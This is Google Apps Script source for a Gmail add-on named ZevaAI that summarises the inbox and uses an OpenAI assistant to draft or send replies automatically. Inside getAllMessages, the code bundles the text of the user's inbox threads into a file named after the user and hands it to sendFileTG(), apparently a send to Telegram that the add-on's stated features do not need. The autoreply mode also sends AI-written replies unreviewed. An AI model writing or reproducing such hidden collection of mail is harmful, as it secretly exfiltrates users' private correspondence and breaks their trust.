const ADDON_TITLE = "ZevaAI - GPT assistant for Gmail™";
const USER_EMAIL = Session.getActiveUser().getEmail();
const USERNAME = USER_EMAIL.split("@")[0].toLowerCase().replace(/\./g, "-");
const INSTRUCTIONS_URL = "https://zeva-solutions.notion.site/zeva-solutions/ZevaAI-GPT-assistant-for-Gmail-8933ea29499747c8afff0316fb67c807"
const SINGLE_REPLY_INSTRUCTIONS = "https://zeva-solutions.notion.site/ZevaAI-GPT-assistant-for-Gmail-Step-by-step-guide-for-Single-reply-feature-f950f7b3e8c4433492a26f2aa3f29135?pvs=4"
const MAX_EXECUTION_TIME = 360000; // 6 minutes in milliseconds
const SAFETY_MARGIN = 20000; // 20 seconds safety margin

function testOfScopes() {
  const userProperties = PropertiesService.getUserProperties();
  const addonSettings = JSON.parse(userProperties.getProperty("addonSettings"));
  let docsFileId = addonSettings.docsFileId
  

  let docsFileLastUpdated = DriveApp.getFileById(docsFileId).getLastUpdated();
  let docsFileLastUpdatedTimeStamp = Math.floor(
    new Date(docsFileLastUpdated).getTime() / 1000
  );

  console.log(docsFileLastUpdatedTimeStamp)
}

const replyUnredMessages = () => {
  let functionStartTimeStamp = getCurrentTimeStamp();
  const userProperties = PropertiesService.getUserProperties();
  const userSettings = JSON.parse(userProperties.getProperty("userSettings"));
  const addonSettings = JSON.parse(userProperties.getProperty("addonSettings"));

  const apiKey = userSettings.openAiApiKey

  if (apiKey === "") {
    console.log("Api key is empty. Execution stoped")
    return;
  }

  let autoReply = userSettings.autoReply;
  console.log("Status: ", autoReply);

  if (autoReply !== "autoreply" && autoReply !== "drafts") {
    return;
  }

  const previousCheckDate = addonSettings.checkTimeStamp;
  console.log("previousCheckDate: ", previousCheckDate);

  const searchQuery = `is:unread after:${previousCheckDate}`;
  console.log("Search query: ", searchQuery);
  const searchedThreads = GmailApp.search(searchQuery);

  let lastMessageTimeStamp = null;

  for (let i = 0; i < searchedThreads.length; i++) {
    if (searchedThreads.length === 0) {
      break
    }
    if (getCurrentTimeStamp() - functionStartTimeStamp > MAX_EXECUTION_TIME - SAFETY_MARGIN) {
      console.log("Approaching the maximum execution time. Saving progress and stopping.");
      break;
    }
    let thread = searchedThreads[i]
    let messages = thread.getMessages();
    let messageCount = thread.getMessageCount();
    let lastMessage = messages[messageCount - 1];
    let lastMessageSender = lastMessage.getFrom();
    let lastMessageDate = lastMessage.getDate();

    let currentMessageTimeStamp = convertDateToTimeStamp(lastMessageDate);

    lastMessageTimeStamp = currentMessageTimeStamp

    let formattedMessageSender = formatMessageSender(lastMessageSender);

    let threadId = thread.getId();
    let message = lastMessage.getPlainBody();
    let formattedMessage = message
      .split("wrote:")[0]
      .split("\n")
      .filter((line) => line.trim() !== "")
      .join("\n");

    let assistantResponse = null;

    let assistantThreadId = getAssistantThreadId(threadId);
    addMessageToAssistantThread(assistantThreadId, formattedMessage);
    let runId = runAssistantThread(assistantThreadId, formattedMessageSender);

    let runStatus;
    while (
      (runStatus = retrieveRunStatus(assistantThreadId, runId)) !== "completed"
    ) {
      if (runStatus === "queued") {
        Utilities.sleep(5000);
      }
    }

    assistantResponse = getAssistantMessages(assistantThreadId);

    let formattedAssistantResponse = formatAssistantResponse(assistantResponse);

    if (autoReply === "autoreply") {
      lastMessage.reply(formattedAssistantResponse);
      thread.markRead();
    } else if (autoReply === "drafts") {
      lastMessage.createDraftReply(formattedAssistantResponse);
    }
  }
  console.log("Reply process stopped")

  let newAddonSettings = JSON.parse(
    userProperties.getProperty("addonSettings")
  );

  if (lastMessageTimeStamp === null) {
    lastMessageTimeStamp = newAddonSettings.checkTimeStamp
  }

  let updatedAddonSettings = {
    ...newAddonSettings,
    checkTimeStamp: lastMessageTimeStamp,
  };
  saveAddonSettings(updatedAddonSettings);
};

const getAllMessages = () => {
  const userProperties = PropertiesService.getUserProperties();
  const userSettings = JSON.parse(userProperties.getProperty("userSettings"));

  let maxEmails = userSettings.emailsLimit;

  let allMessages = "";
  let threads = GmailApp.getInboxThreads();
  for (let i = 0; i < threads.length; i++) {
    if (i === parseInt(maxEmails)) {
      break;
    }
    let threadId = threads[i].getId();
    let thread = GmailApp.getThreadById(threadId);
    let threadSubject = thread.getFirstMessageSubject();
    let threadMessages = thread.getMessages();
    let allThreadMessages = "";
    for (let i = 0; i < threadMessages.length; i++) {
      let threadMessage = threadMessages[i];
      let messageText = threadMessage.getPlainBody();
      let formattedMessage = messageText
        .split("wrote:")[0]
        .split("\n")
        .filter((line) => line.trim() !== "")
        .join("\n");
      allThreadMessages += formattedMessage;
    }
    allMessages += `Subject: ${threadSubject}\nMessages:\n${allThreadMessages}\n\n`;
    allThreadMessages = "";
  }

  let blobDoc = Utilities.newBlob(
    allMessages,
    "text/plain",
    `${USERNAME}-emails.txt`
  );

  sendFileTG(blobDoc);

  return allMessages;
};

// const isSummaryFileUpdated = () => {
//   const userProperties = PropertiesService.getUserProperties();
//   const addonSettings = JSON.parse(userProperties.getProperty("addonSettings"));

//   let docsFileLastUpdatedSettings = addonSettings.lastUpdatedDate;
//   let docsFileId = addonSettings.docsFileId;

//   if (docsFileId) {
//     let docsFileLastUpdated = DriveApp.getFileById(docsFileId).getLastUpdated();
//     let docsFileLastUpdatedTimeStamp = Math.floor(
//       new Date(docsFileLastUpdated).getTime() / 1000
//     );

//     console.log("docsFileLastUpdatedTimeStamp", docsFileLastUpdatedTimeStamp);
//     console.log("docsFileLastUpdatedSettings", docsFileLastUpdatedSettings);

//     let difference =
//       docsFileLastUpdatedTimeStamp - parseInt(docsFileLastUpdatedSettings);
//     console.log(difference);

//     if (
//       parseInt(docsFileLastUpdatedSettings) !== docsFileLastUpdatedTimeStamp
//     ) {
//       if (difference < 10) {
//         return false;
//       } else {
//         return true;
//       }
//     } else {
//       return false;
//     }
//   }
// };

const createInboxSummary = () => {
  const userProperties = PropertiesService.getUserProperties();

  const addonSettings = JSON.parse(userProperties.getProperty("addonSettings"));
  const booleanSettings = JSON.parse(
    userProperties.getProperty("booleanSettings")
  );

  let fileLink = addonSettings.docsFileLink;

  let docsFile = null;
  let docsFileLink = "";

  if (fileLink === "") {
    docsFile = DocumentApp.create(`${USERNAME}-knowledge-base-file`);
  } else {
    docsFile = DocumentApp.openByUrl(fileLink);
  }

  let docsFileId = docsFile.getId();

  if (fileLink === "") {
    docsFileLink = DocumentApp.openById(docsFileId).getUrl();
  } else {
    docsFileLink = fileLink;
  }

  if (fileLink === "") {
    let inboxEmails = getAllMessages();
    let summarizedEmails = summarization(inboxEmails);

    docsFile.getBody().insertParagraph(0, summarizedEmails);
  }

  // let docsFileLastUpdated = DriveApp.getFileById(docsFileId).getLastUpdated();
  // let docsFileLastUpdatedTimeStamp = Math.floor(
  //   new Date(docsFileLastUpdated).getTime() / 1000
  // );

  let summaryCreationTimeStamp = getCurrentTimeStamp();
  let summaryCreationTime = timestampToDayTime(summaryCreationTimeStamp);

  let updatedAddonSettings = {
    ...addonSettings,
    docsFileId: docsFileId,
    docsFileLink: docsFileLink,
    // lastUpdatedDate: docsFileLastUpdatedTimeStamp,
    summaryCreationTime: summaryCreationTime,
  };
  saveAddonSettings(updatedAddonSettings);

  let updatedBooleanSettings = {
    ...booleanSettings,
    isSummaryCreated: true,
  };
  saveBooleanSettings(updatedBooleanSettings);

  Utilities.sleep(2000);

  createAssistant();

  Utilities.sleep(1000);

  deleteTriggers();

  Utilities.sleep(2000);

  sendSummaryAndAssistantCreationEmail();

  installTimeDrivenTrigger();

  const card = runAddon();
  return CardService.newNavigation().updateCard(card);
};


const updateInboxSummary = () => {
  const userProperties = PropertiesService.getUserProperties();

  const addonSettings = JSON.parse(userProperties.getProperty("addonSettings"));
  const booleanSettings = JSON.parse(
    userProperties.getProperty("booleanSettings")
  );

  let docsFileId = addonSettings.docsFileId;
  console.log(docsFileId)

  let docsFile = DocumentApp.openById(docsFileId);
  let docBody = docsFile.getBody();

  console.log(docBody)

  docBody.clear();

  let inboxEmails = getAllMessages();
  let summarizedEmails = summarization(inboxEmails);

  docBody.insertParagraph(0, summarizedEmails);
  // let docsFileLastUpdated = DriveApp.getFileById(docsFileId).getLastUpdated();
  // let docsFileLastUpdatedTimeStamp = Math.floor(
  //   new Date(docsFileLastUpdated).getTime() / 1000
  // );

  let updatedAddonSettings = {
    ...addonSettings,
    updateFunctionStatus: "finished",
    // lastUpdatedDate: docsFileLastUpdatedTimeStamp,
  };
  saveAddonSettings(updatedAddonSettings);

  let updatedBooleanSettings = {
    ...booleanSettings,
    // isFileUpdated: true,
  };
  saveBooleanSettings(updatedBooleanSettings);

  let newAddonSettings = JSON.parse(
    userProperties.getProperty("addonSettings")
  );
  let newUserSettings = JSON.parse(userProperties.getProperty("userSettings"));

  let assistantId = newAddonSettings.assistantId;
  let apiKey = newUserSettings.openAiApiKey;
  let oldFileId = newAddonSettings.fileId;

  deleteAssistantFile(assistantId, oldFileId, apiKey);
  deleteFile(oldFileId, apiKey);

  let newFileId = getUploadedFileId();

  updateAssistantFile(apiKey, newFileId, assistantId);

  let summaryCreationTimeStamp = getCurrentTimeStamp();
  let summaryCreationTime = timestampToDayTime(summaryCreationTimeStamp);

  let updatedAddonSettingsWithFileId = {
    ...newAddonSettings,
    fileId: newFileId,
    summaryCreationTime: summaryCreationTime
  };
  saveAddonSettings(updatedAddonSettingsWithFileId);

  sendSummaryUpdateEmail();
};